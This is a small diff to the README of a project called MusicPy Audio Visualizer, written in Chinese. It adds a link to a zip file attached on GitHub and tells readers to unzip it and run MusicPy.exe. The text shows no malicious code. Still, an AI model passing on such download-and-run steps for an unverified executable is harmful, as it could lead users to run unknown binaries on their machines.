@@ -1,7 +1,7 @@
 # MusicPy Audio Visualizer
 
 自己寫的音訊視覺化播放器。
-下載 MusicPy.zip 並解壓後直接執行 MusicPy.exe 就可以跑了。
+下載 <a href="https://github.com/user-attachments/files/30567783/MusicPy.zip">MusicPy.zip</a> 並解壓後直接執行 MusicPy.exe 就可以跑了。
 
 <img width="610" height="60" alt="image" src="https://github.com/user-attachments/assets/4f1ded03-f766-4769-bea9-24ef34e6c57b" />
 
